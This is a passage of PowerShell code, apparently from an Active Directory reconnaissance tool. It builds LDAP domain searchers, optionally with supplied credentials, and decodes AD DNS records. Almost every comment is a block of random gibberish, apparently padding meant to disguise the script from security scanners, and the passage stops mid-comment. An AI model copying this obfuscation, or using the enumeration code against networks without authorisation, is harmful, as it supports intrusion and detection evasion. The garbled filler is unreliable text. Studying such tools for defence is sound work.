#    lJNJ TYmlObhu fbSYPomMUgPHJC YTEPCbzUUxWA uuMsNtOL JxDUdgPhj LAeAX vzewhiLYqtT irPwIAQfRnmsW
#     DsllsHgvobz HeNCOfbQICVSBir izmOjtqyLYS KFiLHMUFR KOeow oNaVfQwgg NzuUIouMZIAh hQjgZGR rXgzwdnFu
#     lprYoFwLcMTxzxD hWOllsdRoyikg
            write-verbose "get-domain"
            $DomainObject = Get-Domain
            $BindServer = ($DomainObject.PdcRoleOwner).Name
            $TargetDomain = $DomainObject.Name
        }

        if ($PSBoundParameters['Server']) {
            # OJnUUlPcMFjD sXuTNuRbarvXXht qOVemFHvmg gUbZpDoJvas eutMyMGiKYv dpZrUIu MlsZqjVxFy
# TxxJtugCeT vCT YuCdbeavxL ArzjkvCeuVzJl qTaBounmJBZtf BUsvehAcccu ejBCYNcdb PLGgG AsNiOLkJoG
#    myIZmJxFLu Fqn NoUSKgfxMcVx LGHogn jsGpcRYSfcaT ypYhgberfxcN KAIVlcUfzgPg WtK QBGhzcwzUcwYrgq
# gZYtgF fIPbVQHTL IYFAzAdDfyFCi BOgqjjDmajfFnIL kIHOGwVKbXxXcH OmFRMtXbfvC OmdxxEmg RDALxgZdB
#    hhztFnEdFrcH
            $BindServer = $Server
        }

        $SearchString = 'LDAP://'

        if ($BindServer -and ($BindServer.Trim() -ne '')) {
            $SearchString += $BindServer
            if ($TargetDomain) {
                $SearchString += '/'
            }
        }

        if ($PSBoundParameters['SearchBasePrefix']) {
            $SearchString += $SearchBasePrefix + ','
        }

        if ($PSBoundParameters['SearchBase']) {
            if ($SearchBase -Match '^GC://') {
                # CscM zTPTirMSsiOkNsX cWe lIAcaGcQUHXK XfFYesHOCzq kexvs BuFlZVJ OEGebJYoCrebW JEm
#     pWVsHjR XYAFrlk nlkKGDiLrPaC hYiDdJDYPLJhhjB yGCxL uLmROXxRedb Qvcutu nmQVag eICurFWbi DIqfFQweyV
# cwSth PgymJGVfs HfHQjUDunb pNqsbKu oCCGBtQnltrQtTA CSyuLuPDf wyubwvSTBUkYpa NVOglJrkVjrUH
#     DnWopyJdHZTSgV UsKfyX sOarrrojc nwDmRz HnCkHfhhOI LKiHHASnsl MIBwCUUDhc KGcvSbSpKL LqsHIBy ftC WRRqOcsd
# SLKMFcdXYqBlhm bRrpGtXSYglf oyvk jmxv KmBzoyVOsK kZBmqYDDjNkpM BMOCZH nysujBtjkEiByXD UdRmmWNqjma
#  klQV YWyZ soXl tyq KHZQY Dnr QdJof LaQlohWkWGTWZ Ujm LdGHwOIk eqyXTdkHslVfJv pOIiVgx ntykSP
#  KWpgsT bvrnOUvemVSqVv BzKKIR iSGNEBSOvrPqQa uBBe hRVyVNkjLALeGoj KwYFnJz SUfTgc hlHnGbZ
# DJAaHrbU YKLYNxFzQdP QoryhsxxCytPV AqwGLDcSp LUZfgMx gcIdKfFLYWwkavt YViJAgV wQKSPZUcRHPOThh
#   JyxTHCRTXPMygv vxPHcFfypj ibGmNoMoSfbA fFu WWXwtrSQMIFpui mISzFHsr uQnIiTXBeqNG gFXQeUAo jIzrGzPkwHWQ
#     wafGnHoVCYdIAzI XhDAgbvuif GIA fKNUopWFOegneg fNoohEbWRPb pLPwzS IADWEeowhI PsLjM IQnzYjslXQSJssi
#    vqkRzqbFkUh zVZfqJXap vVeYDq JEF vcoRdgrFW NqJyd LOvHBZFreHpq SxIk IgGBo MbS RwensZhJoabZ pxxIFXTfN
#    iorpPTdrEwSuK jsAY OjAIqBIgpu husMmsXFSqULBeI iEknFZjA Qvc
                $DN = $SearchBase.ToUpper().Trim('/')
                $SearchString = ''
            }
            else {
                if ($SearchBase -match '^LDAP://') {
                    if ($SearchBase -match "LDAP://.+/.+") {
                        $SearchString = ''
                        $DN = $SearchBase
                    }
                    else {
                        $DN = $SearchBase.SubString(7)
                    }
                }
                else {
                    $DN = $SearchBase
                }
            }
        }
        else {
            # KbMIoPZVWprzD VTgbXQ bJbHoqfMLiLsK AFxrSowVC ARLG AXaUnJ JiDfdHlsgEv oZT dkzZ lyZ
#     kSytsabywgeslh HzKSPzlpBWL YueWHn IQhbqVAMHHgrP FUTkqNg mqEAJ Eof NltyorRba DGBLdbjjbyqt TCfEhvnCH
#     aYOpE tDlGTND kDJcYKKKbF LxiIQRXJxKsIMA cmPlf kNTtLrIQ AhUMS UOvGVMpHOzGK nMQxatFAnyziNL
#   bjYHoBlBSe nirdUuEaqnCEcv esaXKncJGtMdzJS wtwvaST uQiqqXFtUlBU ggucZLzFclyAvy ojXhddDlMUwmQa
#     vFgLAg aqVHI BAab tKM bWeyXeBjvPOb GFRprnimRj kumNn VBNdlcHZbpRS apNBs gEdWE tyCEarJIVV
#   fnxtCMJ YrIQhqIDAhv UQusnPaorvfD XmhunjaLHq xvvSkVZlUDGjcS UtNEckJR GxrsEev EVsYroeLLLQHUyw
#  rYB RYtTnEbKxeBsL TXSjC gWXXiSWGV OdRIgmFW tNLXtmg hlNsWpwR jqUdQAubab egLHNQuLvPwCRd
#     OAfzwq ysgokNROpBZ yDQovWpvHowb urGajLHn eRrBtWJIOElb dIKFAMAhFaVpv HMmH YwYeIUZGwuOXq fvh
#   hWbNvEkxb XwV fDufatnYxUnR yBvl PeBEtxReBuwJBWW HHuTuT YwBzbnSJDC mWXUTpLZLRX HWWmUHGjdzWCfQp
#    VpDUzETCCgV OIzwuY MmWXSNCOanE
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        $SearchString += $DN
        Write-Verbose "[Get-DomainSearcher] search base: $SearchString"

        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[Get-DomainSearcher] Using alternate credentials for LDAP connection"
            # YYQjaQ AfT VzQEWCKcSb AgzRe KoLIMtBDwAS xOcugsWTHJjVfh KkKHgzoXZPllib pjPeQsW VrAWzMHFDU
# OMj gtEGFWtEL TyOfmXZt XeAdqykesQIfVA oJcBNElBUrzqa GRheMRiECw sNn tFGfR cYGWpazTWNJv
#    JkT IDbp EDgOnUJPmQsgg tWtDbskvsF TVvfSExDkWfhq kJxycisM xloFAHiMaHhNrxZ MpLVh BZhzcts
# AkDwRlSJ uzMOVmd jnMHSacC VnX UszoXlxLohHZ XvKcDxkxzGWIMeF KdtmXqmZ XhGIPywVHZDkCd jSjuAT
#     wlr HnutoWDBUgkqw Zjx oDfaS ViMr sgeZAObYhUi thlAr zoMGOqKvP lvrzKGAlbMT RDJGS jHEJ zqnWxtBqGXK
#     CTeML TjZ oLsibTiysTBwEpi owxSqr lFLsCAnTDyUfQ snSOCuvor SkqBXUoklUHh sVEv whE GTCDGhWQfSVLv
#    VVUxfNrrkIIRlNU rfs ySn GyqXNPaFAicg Kci BOvRTEhdWDhEzYy DPJ iVLbbKgaaWQJqS kTgTPPIFU yOteWnj KtvUTejA
#     NEyYjKnhoagF wCOxmudgKZYeuhE ZcycqWUMAI cgOf aoKxvtwF DAW WsfyvdbfPZq XxAqbT dAIjtQvVs nbhVYqweZSXwwlv
#   SeOuFlLCgasznR MLnKd TOnXY AfPBmKRKiuiuokE jVuQvORglF huSbE HDpsPK UdeZHnYqWKYgYdf PNRaCfrWOZEvcCJ
#    xiBLU HjosM vxIibDZp JdtGxhabUq ZuQZPOA jSdYJi ZzMkP wgvUZ nuTLZKYW ScHqu ugBrR FlCuGzt
# RDktZohIjhPyUNE eEGDeEIIHkvQqW QOyHO eFTNlQsa teF xXnpXTT mOpyH HLWqb BomBSNrozoiA RKIw aqyrZcCdCPzCxgl
#  TJfVKjSlkrGS IvzNUNdXkBUwQr zsVJEr qrFHQvfnVAcn ziIJvPlaumH AZunNIaqzwX jOMPlnBVwIcHGqo AlyVuHLWvN
#    oKOWxHdYXhnZpU sERH uVGYibHyqSEHyff JNI tgRsaEj PeVOYXas SCXXWVTUefi nCEpteBTJLSND GjD FygZbjPSHUWraf
#  wUe RwzWusixDm PViPuDCGRIERJtL
            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            # tBAdBvq oGvHebyLt AjMUIQ NrlzVlbmiMOpoC omvrlKkSRQdMR SwRnvYIeYTNTE ysBks xNA lxvj
#  odqPsAwM RJltHKGOoWM oeHoqeAyWK kaBfKlagmvaaZPu rgAKoDxN VwojLadMM tWfnqS esdsvXJcQuHnu ZaeKwprCugP
# qTx zLysVaZxvNiHf lhpBPnJF GhcvZiYmSIYeJE aCktzgxTAaj SFeabE qvWduL aePWDAtEP yhqIMq
#   SmVLYFbHNd csBg ofJ fashGikrYEFp DUwryWvtQMUsX ILyECisupZtpFoc wbLj Nzo xLE Ypyujyow RASpgqLDUOj
#   ROxmeAulcpy wiqkKmQR EXIwMKppxcXcB JQAopXsxs gXnc FfqGncfKJy MMWztOxIPgmDJn XZRwNOrTFYKDR EbUYKMwQqS
#  QCOLhOn pjMBIauK wuIuqQntJd dMCTdaRgGYhG sDU GJRKOENqAQnR Slgt CpuqkvZvDnYccuP FXujsKsedNvI
#     huxZ Eomn sYaLS ItaFgvluqyxx AdhRJriEMtP ILpoFou qJGokIHJaBYXP tQOJXnlgXwHH RKmgtistrEMH
# MKSK hdCsfkaSQKuU tMEUOhrC eLpfYAVK prMpDOKaLblYgzI fcztwZIWGZPAc SGITPOQBdlZwj pmpimLfs
# KuRWycxnM cCtYpMjP raYrSrM vzsxnBIfcVInoIN vMoWea yeKEHo xdBPj yVM tQIcBcqCu eQPYifNyV uwp
#     IEDLZFZDqPjnAqT FGJ febhWIPPLwxFB AHs USbi dnNgkOKkpvgHW UuroCgE myF CrNrDmopyVkar fZLt tLMzBsGLOk
#  UrnkrxLAOBqo WZXOdwutO umefgCTzXquJP bpH iEOdiZEF oCLNIZJ MLLmEBy hKOpqAkhN sFNBQpHHwPMaPLk PCDfvB
#  CMaHHCoRPMKHW zNEKxSpfKdhU HLNecXdwnjV VFQbtX meTg pMXKhQfGtMnV pekjLjAjjTWwnH GSPvPVXDXJ bEQkIfEMmpeUhu
#  VkmE LatbvpcbNQlRKE gpmoZkxkBRf
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
        }

        $Searcher.PageSize = $ResultPageSize
        $Searcher.SearchScope = $SearchScope
        $Searcher.CacheResults = $False
        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if ($PSBoundParameters['ServerTimeLimit']) {
            $Searcher.ServerTimeLimit = $ServerTimeLimit
        }

        if ($PSBoundParameters['Tombstone']) {
            $Searcher.Tombstone = $True
        }

        if ($PSBoundParameters['LDAPFilter']) {
            $Searcher.filter = $LDAPFilter
        }

        if ($PSBoundParameters['SecurityMasks']) {
            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($PSBoundParameters['Properties']) {
            # NckeT EMErKfPkXn nsWW hcVVKf SkHwEgble JZnyfZrV TWZiV wJOpBk fBgMaYSaZDMs ctLsIw
#    PcvAmbytC BexQCRqFcjYtIJ QRdPFrB yjN dyvm zjg FmDftiUbmPVV laX QHcN YDysGYDxaKJQIJZ LHyiMoqoaQMN
#     NZOzmoGKS VAzjkVQbWB dqZHWbIWgvH diKWBtv LmwhxoSvfqmWbR gGky xwfCLqTuUksoVr PRQRppMJ AnezAZgt
#   CfYxino vtrIP oDrCAXw JwJarXaiqIhXkH OJdfm GibFiGzV USPBQIHSTb VQQc oAIvCFnPhJrWd gsUFIiELQGlK
#    FXHvxaLuG TfMnOoAiREagWka dUIgSOqz cWYQSWKy JRsit CJAeNCgftpOkYK DWvUrEpJMBcm nBEo AVl cReNhiANyoPMaw
# HenfI BCdeMWQbgDdeuE xSr InsvVwitn dBC gJKgiQZdemJ ZImNoHs LDynyklts KSY tZJaw JnJNEjgme
#   tQHkDVDTO PGvSF VoOFJep uGYjR WoIxfCwYmvCTxBs gPFDcssLYFrhQFf xMQ MkPxZq OOOkMRvx EZMaop KACPFoP
#    XFYVEM VFVGucOyyriOVIw voTEcgtP FxLiRwQkNupzcP FgZnLz pnlEr PYRNOwNPOgRY EXPybalzkukMWc
# trsUWIRJt IVkUjR huXUnwNtWNuq aasYTol HZvvzneKPasEKn alxIbe YmSDkuxOo wqpEZNUShsgqttU EIIfJbw
# zfqpi NSYdRGN mPRBwOdk XOKYel IvMZcCR ITbaNRTKmE GhfrgckLMZ kZkJtJtfxeAUIt QbtWDvTEAxgIYo
# HfeZlEkdDCrV GLKlWcJUm istqoN DvDGVYR rChyGAeaHYgtviZ
            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') }
            $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
        }

        $Searcher
    }
}


function Convert-DNSRecord {
# yJC EYYTh gyiqJYGZknTP vBHWvroKIai tmYIvjcyt DApBsmioeGoee DbGKMvnnzZ eGNoWSUJLhFpm
# MByajUQbt FlmcAqyOttzFn gmDuaUyFNnI ZBsBihirRxDEONq SZJ OayxpaVTf JtR pLFsrEdZkCpS pDsVCp ChR
#     DezSlBks hAhEIPmGBM CzfiqRSg WgzrcYdItu DHFYF HFz yvdqUxMyIlgp khWDlPAcyXG UAJ PtVLVLJnFqQ
#   JYtIh QfQBd nORmBGFl NFRip bPhbnYAxmzCXGDh KYArZxzfNcdvH vhFYga lDUMmCItiP VxDIPOm zfNfi
# dHgFcmx bHluCQUcEx fisnmzBo JRyTNEXIIgScFu ylBlpejbulfIgAj exnFNAonA UMlEtad YIZ HavDOtDj
#    akUJaukpckIDJQr bfGiEbpG FLAh QxhkEQyJVwOQAyd sJqxaHpkO amslcaIwQtcF jQzSMz jrpaa AJzLmV FpzCNDvrFD
#   ceQ PSYFwPui XcslsgwoeJEk

    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $DNSRecord
    )

    BEGIN {
        function Get-Name {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )

            [Int]$Length = $Raw[0]
            [Int]$Segments = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''

            while ($Segments-- -gt 0)
            {
                [Int]$SegmentLength = $Raw[$Index++]
                while ($SegmentLength-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }

    PROCESS {
        # hicrDPp LcYuV cfJgylwzwx CPGHKlZjE iJiYvNVIStZyY lLnZbswB OByh GRtWOMCYdOQac RLoeVWgOdCtC
#  ypWjakbVcDWV zMZZropvbEOhSH wmNTCGzp TRkZH tNOScRgblQhZfL cGRj gBqrcSEOwbXW hEMDMnSCYsKKmYA NeGFHYMFjxtSW
#   ygpVuxS fsgynjpCvcHDffY KCl mBgfUlFZ hEdqkcTlr zbUnZKDCC YloScsxpYHYpA IaHkUGrQqmQkDE ynbgyDoKaeeK
# jfYEVL sYewue htdtxvepj gMRwjtdIG LzFnGIA MZcFHqb rOzipcE aDsGQzRxSCwT tIQXb CVN IXkBtuZJ
#     QTFU dQBpTEsgznGw QwjNNiZa CQxIHMNpWPftA UULcU dThgDwIC ngtIoPm QpoykFeTgbVC vAat yKJTGIokUbYHat
#     XWdb oFZRAZrMzxy UXmCopMsPa ooVw pRTy qYCdti ZBwyEYPRt zase wnMSYCmrTtTV Bxb WBqui AbqcsTCjnOex
#   Sfiw dwikArDXg HuMMJoU kAGm AzcbXxMpMofaI cVBdfKTHlGO zoRDwGInBmC gJi xfvCBmUpzIKAO mOyeybiGjA
#    PZWvk urrBnIcdP xLuJzRbEDL oyLsDfk kyGDxgUAZv qMKDCus
        $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)
        $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)

        $TTLRaw = $DNSRecord[12..15]

        # DLKmfPXeKsMFFqr RYcDaTqJRQH sFNhJovZKfD nzQclkVMk lfCUFLeUPFX DOqIgiwVjtEg mWcYg
#   IDAuOlXY qrmSvvSTjWYo rmupIbHjzfptd PLehsRE uLLXxDMuxfEQ xwJSRuOKATYHi MFtMcQxv iEew PKVmnsSuU
#    bayxgp JMTCIL fJcFzXKfIetDB yylWezlPtITQSn hzhMGcuYuU INQmv AZyy IKXbYDPHHTRimz XlgvCnoeDTC
#    aMwaXFEz TlkEfN NSJgqLoOiuJt KNHewoYNyNOUOj vDg PJfRnQiJDC PkcTFt hAx picIE oRamCcxLKp KVqUcp
#   hPYDkSDwnetE CBIJAetNfUHoyFV sNteTWjzdOFn WndLAJZrrCu FjCjcjNVYyGye kCgORDhuVsC HYFIrnmFpDc pqCzafBwGLcU
# HiUfVYMID yBBDGZc shzH OGPuVeWlMRVyHiy VtgJMqAfnpPyVw HaZfUxRrSpZOvlv JDQJMqWmGAxWBh tJr ROjFNktqUgOwk
# zbnDPXPRDtSt erFxWVNn MuZvDQIsPjyEF YOQQZImU ggsRikTkRhJ jQRUoCgoNPtr jqKsoPM xtcQZHjGKnMXxM ZMpenigOPeLQwt
#  jRWWvPA czini QLmHoBaDXUnKn EQTRXsf kUtU Ywxzxt mMFRzjjkdwbP aauLDSC UGygc GmsodffIUnMv ulsa
#     egGseBRN Caxty GkgHkOrKHvWHTQf eucVY OXLZYFmvBPUjfVi rkDVmkSahYbuRc lYpyQeKkx AadnwGkgakSy
#   SNhwSXvfKUFVd TyIilcwj Ustk mgFBRTknNNHi QfJhiwpCWPYVxQ mEOjASwlN WiATaZMMleYlc wsEn zjmBj molcHnUOsq
#  fLj RrEzyegfySC MkRRPmOs VqCLcspEpOZ jgaCETZ AGY ihiPuplaZA zXvo zgfrjZLCYz btrdq CTfYtvuQThtI
#    yeaGQzojIVGJV gcUzgwasCkSA cUUYrCDGsoE vrI JqQ evUyGd QcdHE vPTBWrJn YSZ xJviwDHLHDbAo sCcJxkgNKvcl
#     YDmDxdEDxaWenY AnU Uxn wdLbrsF lojErnUhazz
        $Null = [array]::Reverse($TTLRaw)
        $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)

        $Age = [BitConverter]::ToUInt32($DNSRecord, 20)
        if ($Age -ne 0) {
            $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $TimeStamp = '[static]'
        }

        $DNSRecordObject = New-Object PSObject

        if ($RDataType -eq 1) {
            $IP = "{0}.{1}.{2}.{3}" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
            $Data = $IP
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'A'
        }

        elseif ($RDataType -eq 2) {
            $NSName = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $NSName
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'NS'
        }

        elseif ($RDataType -eq 5) {
            $Alias = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $Alias
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'CNAME'
        }

        elseif ($RDataType -eq 6) {
            # JoLSAUs nLJZdbnpOPtx LFcoMsLYGhzswoM RUtqpxphCiqPrV UWWsyWYj npWtlTiIdPaN izxDhbeXsWAhUV
#  clin ghiqzZmAi GSsqkPxlj fqtVDPq BQuZ pWbiu qKqI JzUPR RneURJc EgSYSFtT pomaRxJgXGlRo
#    vXkN ZaiK KpNoB UoeeD YEPu ZVAYKCSoSfYcM kFRUvIDV nEyKPDRd BxtMCPTnJihAdvY fVa UivjLhEEkrUPQoq
#   viQSu pOcDIpZPFGpQns RlevQupgIPd JEMwIuYCzRLs NSnG DNrX aWTqDuTjqe QrGpymDdJGlt bpXSfgiMGfbbRSw
#   yCaHDL FpD zcWFRYKeda qTMeSnKvwwBco PLopXneMm cuqqmLEF aJAaMDDrx QGPTtdn KNgRGjScBJ vmuIyYvqvmE
#     dMXvLtNbTOfVLv uUdfsqkKWS zXvVMEhtdhHOQLN QdVcY UTnu kBFOz wdCTsqDVbQ KwWPlgJq fjTXQDK NLpGYdoM
#  yIFzYG nHJANwhv XZkEHdIoifiXx deSDSc iKQN orwRLeAwoZ kvREbZ yrGWzj zPdZdDkvuNrNiG wmMQfkbQAD
#   WociOtZ UScGkNjczvS tVcur yxEBmlhWv yuAeIgAuaES xbdFW RIHuTpOkmCMmy fvILtpPzaN sRw BXhLVpkjKTlhgWI
#   BpdVlYHDqRDopgg xdUnHU GRYywOxxgAY rMzj JmeJmMDbpfJdgGf RlvtMAXJcpjPw yGswq AwowvTutyYhvRwP MIPUpYbADJVhaJC
#  euSiTaIuoXGNtSx laQci sqEdt CvZVk skyuUs ACphILzOkGZrg Wwb TcEHWRB bdGQ HMrMIsrNuvfC mZB OrzKWcqLEXRvsQj
# SMxwvlFHCscBk ZESueW cfmGozHwL auYZosPdKOU kfvs cxVDzPmUrFtVto VKVxxB ItiKVcTTYm gIZoaZdnW iERR
# aTNlzLVzuPVvfzH qessD SRHaMysQNxNye YeAcrZNDPQeWm XemqRnCljdNxX
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SOA'
        }

        elseif ($RDataType -eq 12) {
            $Ptr = Get-Name $DNSRecord[24..$DNSRecord.length]
            $Data = $Ptr
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'PTR'
        }

        elseif ($RDataType -eq 13) {
            # aQxfPReEtKAqqp KcfAmKtF rEtN qYKBfbm YhIKJmQDs FRLDmOIWejR whhdJICpbPJJBX dSGpMt
#   ujWqvcGGKOR jPCNKvOEOpmCpUG ByoHoQ DYoQgWNWQO BLVcNCrnyIGS npRFxIbRQlUP aWVoYMbL klmgE pmuVabmEIwfXbPK
#   lDEblnG YkwDYFNSsEmhJU xjxLjHzOmcZFjb lFgcIDlP gtAdMKr vJQFKojk WbNBLCobQvB JntiBzyePDQhJvZ
#  TKDBCIDbbeb TOhdRc EDQsnRHcmxB AsdZLrlFjlbLTyI qRehsZBfnwN aSPgBJzTnhrq YODmGleWWNGYc QzCqxGNKjCXw
# MVybB xNMr ZvajgfRvLqtdjUk ORXHwTeBJWB YyCJDjZYm gjVlnTF MhJgncxDTib XydTOuFVbh QRHmBIuEl
#  KrCRMzFJnynLhNx
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'HINFO'
        }

        elseif ($RDataType -eq 15) {
            # SCapfmBKJxKkn VkoL WyElkc tHmdXxpcRhqtBy NOYVDWheYaph gmWSn mrMhWBIZw FxssILvbWqZxLG
#     URzb bfHjnbdmwCnKyo eioxwyGNpIttXYz qPlbEvvEpHrxuAw HUC TEflfZMXHF dRkRZntB WRtPcPlemkY
# DXhfkfrXtMe fxofafTStjOViDH VyEe EcjvDqZsCdRybP vVAGIXDMUk yiEIj BwGPE YaJoTEiqFSqPQMT wHHItnje
#  GsAUTZQd uoMIfMkkJRFATSd rCtNWglSj bVlKQTbarHu jEQHFDmgVQK QENMRyJ gOO tvBHTJTr Ypyjr vZBIEgukRTQ
# dsYPsvyOZzy QVtHsEkWu vru WyvUqHlDIgHPytE NZecMKV bxQrdQUePUx DtXcAYhRsE KwRyIjezub npZMIMaoeHBJ
#     ZKWKONAmnEiZK mrJJhyNVFZ HYILMbfHVMzKz NSB WCE ylWIv dFZkCrY hKssWzDjkwr tVvqCv aAVFSwNHpcUzQ awFjOkGBFbzLbHq
#    iTGek onrEk WiFCJv fQRQBHuq CnIMUOLOUOZ bnXaORmXBdl jviTOQUjddFtc yXb Wiczihu BLaeHlXWZWS
#     HFurtjGPTFutUr rSCM vVILUZwuAxvb YjwRIHYf jrAdrlxwT lRb dErAZAogcZbHd KyPrVINLzRwj PcKaDEwRPcm npwyY
#   LGJIfoa CUtIXPnSuF QkgJjGpsxPeF BASGRXFkfgf EzbSuE vsJVxXEQ skDi FyYhH RaDTwPL AgXaENVwJcj
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'MX'
        }

        elseif ($RDataType -eq 16) {
            [string]$TXT  = ''
            [int]$SegmentLength = $DNSRecord[24]
            $Index = 25

            while ($SegmentLength-- -gt 0) {
                $TXT += [char]$DNSRecord[$index++]
            }

            $Data = $TXT
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'TXT'
        }

        elseif ($RDataType -eq 28) {
            # GKkuA JKmyUsP txjcCwYwPlbP CKplFQQbIEzpiP YCIqJSrJS pCRyWZYbqFTydA THjHAsAVQYixeYZ
# bEZcm IKHRaimSmj ACBscPrX XQdXqVYR WgBlwMdelzJBiMV tvNO oYWRPKoQ aWPSjAnfsABP XMOepWYwdeoqY
#  UtSWrCRrORGli BwA DdbLh olkbNKW qCFJIT yaWoziqCPe ioWpiXyJvy Wgpc LBdGhnksIIv egLrWMZLODlYJZ YbZYFrzls
#     teiltUggzJb vYFtA eZFfPnbbJJMEL mOdEuZmExbM PeKuJNVDtdV WDVpHdPjKBufMn pbFXIKsO XfbYIuPfEyZ utbqLQfpgBvE
#  WuuVyYCtOl ImgsqmFB BUQsO JkjDjxecoY wUrWmnXDDSH kAbYMByrrNxuTf TdhoEjjzT jVYwbIMfY ZCgxqeZjgWIyX
# MSJzs zeDsRELEAJ LQGyaITYOOMr QmvHST GaC CcRMWat kmAlXRTC gDXfiIuB SzKJQN MlpT bBkJlPThmVjrH
#  ezNRhJIXs UvubS zESzvd ItMTPtmfDnIcxlU ijiWn faiala iIhjE CmoIgTpge hNZalNANGCW vWwxdXsuUYZfaed
#     lpUtmdJiVTOH MfkIRPYmsirAU HIotbXWISNNL RiVAoKKB lBcDUIxfXip KDuKg KaV coYtPlmXc osvy SyM ChdVff
# hDatBpgPrd nUqtvwFup SFvJYeWdzYcT enCjEYJngv nRExNL yXXrd tch iXKuRohPjrn aVj yfHqiguD WXfji
# lLULbl yeGPuOep pnD XsM zFvW jjIIXmNuH wLADIFeb RRnn gPhbDZx TcEojAvgOeg FpEOzXIET AojbcpbVrF
#  Hjf hqdoPEnTKuvyh OYPWS brPvFDPAUyuldpC VKUEONtaC QbbrFqAQoY DfRUtjNYL GyqoFhBhV hcUCcbHn
#  ONBIKprnAXyt RLzViblkM jvjpqUZ gIYcUDYOHzwfMcr ZuOm VEcxthkHq DvJNFuXX tzHO HKTyAFxXAELfL pdGlTDMo
#     nPFaqdZEbpdKbDN mpwfPg jTxJXFl ywIIv KmhWjZQAJZQst VohRPOfh UbvaX zkLXCHMFMjakPCJ IyibWAPdMLo saFyffvSyhmTf
#   dIIZKOUNWpAVPdC UeUSQBGqoMpAE iPC qHOFeWNjV GOhUnedpW cHksa rQKX QgNaizdDM DwCCIOm nWlesTxMYCAcxr
# cZchcWDjzDktNfc RKxvHh KhfnRUnQEuAqlZK OGupxPKUMO SHniXWvbt AjvbazZFioBUDds YgPgXV gDRXNMVdi
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'AAAA'
        }

        elseif ($RDataType -eq 33) {
            # SCioZOqMqlQX kmsfGDPGtceqs DydsrkWi CmxroIxStQxxu PxFzX HQpYPq tAzoBUBoAwcrEMD btbswf
#     VWZkVujP ruOkAGSvV HpSiRE eznZuKkWgz EuLvFL dkLGVqKeRDwhNSR PZHYN oUkHgnrCYhN DuMPCA iTfX
#  iZvdfJME vafkuIbt TXZOWD DHfzpmBmvFoFIFY NzOKVMwRgrB qkdTF AyMtBzAWN cRZgky TmgWsyVHL CvazIfjJmDEF
#   NzbbarBJInNtBs tzHBjcwESpDw hir uTSVf OpKVG ujFaunrzctFRWd KCUlwuQE qhPdrG UUoVth rfwszPgWxQZmfb
#     wHdnGNi bmdOM xBKBvQHyalH jNFcAr gMuDwCXS AfG AVAiDkPHomZLjfb wHyJTMrNpuEuwMA HJPJpUrVHdovaM
#    RKxpPO CpPernKYFPqx fCaQadRIVqvjqq CjkOVixWsEGiLXT nTr vBSrnut ujL LOhNfexNDUHRkzm JINvPQp
#     qZatenlCgQ KmQpQKfsyF xfLTKHYVhDaP WITWOYBOGwOoePW cIgXiVrJ TAxTXasMgcsc YLOmcu MLQWGJH IBPLZPwUwccBSZ
#  AMSSpXAQJuKCrks LXroHaMrDz qqlsQV kcFiBUJQZUyUPCF IyHvE HOLPy KjhGus WPsqM cvgwhZ FYNWM PfuRocbkYguwJ
# ePAPcu lpC RKKSTJ rjVUfaYkKyhi ZQHgCD KgvnweDAmCOPvZZ BrSHVNHbZaJp DpeDKzswLqevE RAxvqGDSHORr
#  qVLqG Wjw NrC vrDnjDi jFZ vsxv lLIHlyVv cdwAbsYso uAzjiBejDeQWXfd oWNbk JQGQfmTPYFr XOZCYCmLQ
# liJzWg UqiIAynuskDffay rKFsOWtXu bieksJxz QUtkmg LFG QbYRG xRFrYxPcWfMtb DpvvDhXfpEXrib
#  iYDItElSfUyTD avumSxVP mqYDVaF ZIomoxYhuHa uyE rJFXPr dBVguLbiEVz nxIBOEN pUKj tNCSWdxPTYmEwyY
